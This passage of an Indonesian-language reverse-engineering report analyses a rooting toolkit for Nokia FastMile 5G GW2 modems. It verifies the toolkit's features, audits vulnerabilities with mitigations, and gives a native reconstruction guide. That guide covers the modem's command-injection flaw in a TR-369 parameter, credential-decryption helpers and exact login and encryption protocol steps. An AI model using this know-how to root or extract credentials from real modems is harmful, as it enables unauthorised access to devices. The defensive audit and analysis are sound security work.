| V-07 | SSH Sniper + Guardian daemon melawan watchdog Nokia | **Hadir Lengkap** | OBS: `SSHSniper.wait_for_shutdown` (`0x180033a60`), `snipe` (`0x180036130`, batas uptime `90.0` dtk), dan `install_guardian` (`0x180035880`). |
| V-08 | Verifikasi MD5 dengan *targeted auto-retry* ≤3× & pengecualian `WAJAR-RW` | **Hadir Lengkap** | OBS: `MD5Validator.verify` (`0x1800553a0`) & `verify_with_auto_retry` (`0x18005ef50`) + `redump_single_partition` (`0x1800487f0`). |
| V-09 | Startup wizard + persistensi `config_toolkit.json` | **Hadir Lengkap** | OBS: `startup_wizard` (`0x18006fb50`), `load_saved_config` (`0x1800131c0`), `save_config` (`0x180014fb0`). |
| V-10 | Terminal SSH interaktif `[4]` | **Hadir Lengkap** | OBS: `open_interactive_shell` (`0x180085c70`) memanggil klien `ssh` bawaan OS. |
| V-11 | Unroot / Revoke akses root `[r]` via SSH **maupun Web API** | **Hadir Lengkap (Keduanya)** | OBS: Koreksi atas revisi lama — baik jalur SSH maupun *fallback* Web Management API (`FastMileRCE.execute_rce`) terbukti ada di `menu_revoke_root` (`0x180089440`, `mod_consts[1193..1197]`). |
| V-12 | Modul komunitas OpenWrt `[n]` | **Hadir sebagai Easter Egg** | OBS: `menu_openwrt_troll` (`0x18009d340`) hanya menampilkan lelucon komunitas sesuai klaim README. |
| V-13 | Backup "52 partisi lengkap" | **Hadir & Konsisten** | OBS: 50 partisi user-area (`/dev/mmcblk0p1..p50`) + 2 partisi boot (`mmcblk0boot0`, `mmcblk0boot1`) = 52 partisi, ditambah register `ext_csd`, `CID`, dan `CSD`. |
| V-14 | Konsistensi lintas platform (Windows vs Linux/ARM64) | **Tidak Konsisten di Rilis** | OBS: Aset Windows adalah v1.1 asli (CPython 3.13.14), sedangkan aset Linux pada rilis yang sama masih membawa kode v1.0 (CPython 3.12). |

---

## 11. Hal yang Masih Memerlukan Verifikasi pada Modem Fisik (Live Modem)

Karena seluruh logika aplikasi PC dan biner pendamping (`dbai_nokia.dll`, `bin\busybox`, `bin\test_decrypt_node`) telah berhasil direkonstruksi 100% secara statis, hanya perilaku sisi firmware modem berikut yang memerlukan perangkat fisik Nokia FastMile 5G GW2 untuk konfirmasi empiris:

1. **Konteks Daemon TR-369 di Modem:** Daemon mana pada firmware modem yang mengeksekusi nilai `mqtt_brokeraddress` tanpa sanitasi (apakah langsung berjalan sebagai `root`) dan bagaimana ia menulis balik hasil eksekusi ke `tr369_config['MQTT']['BrokerAddress']`.
2. **Validitas Ciphertext Statis di `bin\test_decrypt_node`:** Apakah kelima *ciphertext* yang di-*hardcode* di dalam `test_decrypt_node.c` menggunakan kunci enkripsi global yang sama di seluruh unit Nokia FastMile 5G GW2 (sehingga menghasilkan hash SHA-256 `superadmin` pabrik yang identik per batch firmware), atau hanya berasal dari satu unit sampel milik pembuat tool.
3. **Ketersediaan Fitur Web UI SuperAdmin:** Apakah login sebagai `superadmin` pada versi firmware terkini benar-benar menampilkan menu Cell Lock (4G/5G), Band Lock, dan pengaturan APN lanjutan di antarmuka web modem.
4. **Status Server FOTA Nokia Cloud:** Apakah `https://swupd.wifi.nokia.com` masih melayani pembaruan OTA untuk model `5GGW2-OMNI-2` ketika dipicu melalui sinyal D-Bus `triggerOtaPollingFromPortal`.

---

## 12. Audit Keamanan Defensif & Rekomendasi Mitigasi

### 12.1 Kerentanan pada Firmware Modem (Sisi Target)
1. **Injeksi Perintah OS via Parameter TR-369/USP (`mqtt_brokeraddress`):** Endpoint `/tr369_web_app.cgi?set_params` meneruskan parameter `mqtt_brokeraddress` ke shell tanpa sanitasi metakarakter (seperti *backtick* `` `...` ``). **Mitigasi:** Validasi input `mqtt_brokeraddress` agar hanya menerima alamat IPv4/IPv6 atau *hostname* RFC-1123, dan hindari pemanggilan `system()`/`popen()` saat mengonfigurasi klien MQTT.
2. **Pembajakan Konfigurasi Daemon Hardware AIC (`/configs/aic_conf.json` & `/configs/init_action.sh`):** Partisi `/configs` yang dapat ditulis memungkinkan *override* langsung terhadap `/etc/hb/aic_conf.json` dan `/bin/init_action.sh` tanpa verifikasi tanda tangan digital. **Mitigasi:** Terapkan pemeriksaan integritas kriptografis pada skrip inisialisasi atau abaikan *override* skrip eksekusi di partisi `/configs` pada build produksi.
3. **Eksposur Fungsi Dekripsi Konfigurasi (`libcfgdb.so::cfg_db_decryptNodeValue`):** Proses lokal yang berjalan sebagai `root` dapat memanggil `cfg_db_decryptNodeValue` secara langsung.

### 12.2 Kelemahan Keamanan pada Toolkit PC (`dbai_nokia.py`)
1. **Penyimpanan Kredensial Plaintext:** `config_toolkit.json` menyimpan `web_pwd` dan `ssh_pwd` tanpa enkripsi di disk lokal.
2. **Penonaktifan Verifikasi Host Key SSH (`AutoAddPolicy`):** `paramiko.AutoAddPolicy()` dan `-o StrictHostKeyChecking=no` membuat koneksi rentan terhadap intersepsi *Man-in-the-Middle* (MitM) di jaringan lokal.
3. **Penggunaan Password Root Bawaan yang Seragam:** Skrip injeksi menyetel password `root` yang sama di setiap modem yang di-*root* dan mengaktifkan `PasswordAuthentication=yes` pada port `2222`.

---

## 13. Panduan & Checklist Rekonstruksi Clean-Room (Rust / C++ / C / Python)

### 13.1 Perbandingan & Pemetaan Pustaka untuk Rekonstruksi Native (Rust vs C++ vs C)

Biner asli berukuran **46,3 MB** karena membundel seluruh runtime CPython 3.13 (`python313.dll`), OpenSSL (`libcrypto-3.dll`), dan ekstensi Rust (`cryptography_rust.dll`) di dalam arsip Nuitka `KAX`, lalu mengekstraknya ke `{TEMP}\onefile_{PID}_{TIME_US}_{RANDOM}` setiap kali dijalankan. Jika ditulis ulang secara *native* menggunakan **Rust**, **C++**, atau **C**, ukuran biner tunggal statis hanya berkisar **2–4 MB** (sudah termasuk `bin/busybox` 1,14 MB dan `bin/test_decrypt_node` 131 KB di dalam `.rodata`) dan **tidak memerlukan ekstraksi direktori sementara ke disk**:

| Komponen / Kebutuhan | Rust (Rekomendasi Utama) | C++ (C++17/20) | C (C11) |
|---|---|---|---|
| **Hashing (`login`, `MD5Validator`, Menu `[s]`)** | Crate `sha2` (SHA-256), `md-5` (MD5), `hex`, `base64` *(Catatan: `pbkdf2` **tidak diperlukan** karena `login` terbukti memakai iterated SHA-256, §4.3)* | OpenSSL `EVP_sha256()` / `EVP_md5()` atau MbedTLS | OpenSSL `EVP_Digest*` / MbedTLS `mbedtls_sha256` & `mbedtls_md5` |
| **Enkripsi Web CGI (`_enc_post`)** | Crate `aes` + `cbc` (AES-128-CBC PKCS#7) + `rsa` (`Pkcs1v15Encrypt`, PEM parser) + `rand` (`OsRng`) | OpenSSL `EVP_aes_128_cbc()` + `EVP_PKEY_encrypt` (`RSA_PKCS1_PADDING`) | OpenSSL `EVP_Cipher*` + `PEM_read_bio_PUBKEY` |
| **Pembangkitan Kunci SSH (`SSHKeyManager`)** | Crate `rsa` + `ssh-key` (format PEM & OpenSSH `ssh-rsa`) | OpenSSL `EVP_RSA_gen(2048)` + pemformatan blob `ssh-rsa` | OpenSSL `RSA_generate_key_ex` / `libssh2` |
| **Klien HTTP & Cookie (`FastMileRCE`)** | Crate `ureq` (sinkron, ringan) atau `reqwest` (`blocking` + `cookies`) | `libcurl` (`CURLOPT_COOKIEFILE`) atau `cpp-httplib` | `libcurl` (`curl_easy_*`) |
| **Klien SSH, SFTP & Shell (`SSHSniper`, `DumperEngine`)** | Crate `russh` + `russh-sftp` (murni Rust, mudah di-*cross-compile* statis) atau `ssh2` | `libssh2` (`libssh2_channel_exec`, `libssh2_sftp_init`) | `libssh2` |
| **Server HTTP `8081` & TCP `8888` (`BackgroundServers`)** | `std::net::TcpListener` + `std::thread` (melayani `busybox` langsung dari slice memori) | `std::thread` + POSIX/Winsock2 `socket` | `pthread` / `_beginthreadex` + POSIX/Winsock2 `socket` |
| **Penyematan `busybox` & `test_decrypt_node` Tanpa Temp File** | Makro `include_bytes!("../bin/busybox")`: disajikan langsung dari RAM via HTTP `8081` dan dikirim langsung dari RAM via stream SFTP | `std::embed` (C++23) / `xxd -i` / `.incbin` | `xxd -i` / linker symbol `_binary_busybox_start` |
| **Parsing JSON (`login`, `config_toolkit.json`)** | Crate `serde` + `serde_json` | `nlohmann::json` atau `yyjson` | `cJSON` atau `yyjson` |

### 13.2 Keunggulan Arsitektural jika Direkonstruksi ke Native (Rust / C++ / C)

1. **Zero Disk Extraction untuk Aset Modem:** Pada versi Nuitka asli, `bin\busybox` (1,14 MB) dan `bin\test_decrypt_node` (131 KB) harus diekstrak dulu ke `%TEMP%\onefile_...` agar bisa dibaca oleh `BusyBoxHandler` dan `sftp.put()`. Pada implementasi Rust/C/C++, kedua biner ELF tersebut cukup disematkan sebagai array byte konstan di seksi `.rodata`:
   - Server HTTP port `8081` langsung menulis buffer `BUSYBOX_ELF_BYTES` ke soket saat modem meminta `GET /busybox`.
   - Klien SFTP pada `extract_live_credentials` langsung menulis buffer `TEST_DECRYPT_NODE_ELF_BYTES` ke *handle* berkas jarak jauh `/tmp/test_decrypt_node` tanpa menyentuh disk PC.
2. **Eliminasi 7 Skrip Sampah (`bin\*.sh`):** Ketujuh skrip firmware Nokia di KAX #26–#31 dan #33 (~51 KB) tidak pernah dipakai oleh kode aplikasi dan tidak perlu disertakan.
3. **Koreksi Kriptografi (Tanpa PBKDF2):** Reimplementasi native cukup menyertakan primitif `SHA-256`, `MD5`, `AES-128-CBC`, dan `RSA-2048 PKCS#1 v1.5` (tanpa memerlukan modul `PBKDF2`, `libsodium`, atau `bcrypt` kecuali dibutuhkan oleh pustaka SSH).

### 13.3 Checklist Kepatuhan Protokol untuk Implementasi Ulang

1. **Kepatuhan Protokol Web CGI (`FastMileRCE`, §4):**
   - Gunakan `_urlesc` (`.replace('+', '-').replace('/', '_').replace('=', '.')`), `_hp` (Base64 dari SHA-256 biner `f"{x}:{y}"`), dan `_su` (`_urlesc(_hp(x, y))`) sesuai §4.2.
   - Terapkan alur 4 langkah `login` (§4.3): `GET ?nonce` → `POST ?salt` (jika `iterations >= 2`) → *iterated SHA-256* atas `alati + pwd` diikuti `iterations - 1` putaran atas `bytes.fromhex(K)` → `POST /login_web_app.cgi`.
   - Terapkan `_enc_post` (§4.4): AES-128-CBC dengan PKCS#7 manual, bungkus string ASCII `f"{b64(key)} {b64(iv)}"` (dipisahkan spasi `' '`) dengan RSA-PKCS1v15, dan gunakan parameter `csrf_token=` (bukan `ucsrf_token=`) pada `_post_csrf`.
2. **Kepatuhan Operasi SSH, Streaming, & Modem (§5 & §7):**
   - Gunakan pembatas 4 titik dua (`::::` / `0x3a 0x3a 0x3a 0x3a`) pada *receiver* TCP port `8888` (§5.1).
   - Gunakan daftar port `(443, 80, 53, 2222)` dengan timeout `35` detik pada `wait_for_shutdown` dan batas `/proc/uptime` `<= 90.0` detik pada `SSHSniper.snipe` (§5.2).
   - Baca byte offset `267` (`PRE_EOL_INFO`), `268` (`LIFE_TIME_EST_A`), dan `269` (`LIFE_TIME_EST_B`) pada `ext_csd.bin` (§5.3).
   - Gunakan hash SHA-256 huruf besar (`.hexdigest().upper()`) beserta `cfgcli --save-db` pada `menu_change_superuser_pwd` (§7.2).
   - Sertakan jalur *fallback* Web API pada `menu_revoke_root` (§7.4) dan aktivasi `X_ALU-COM_SwMgnt` via `cfgcli` pada `menu_trigger_ota` (§7.3).
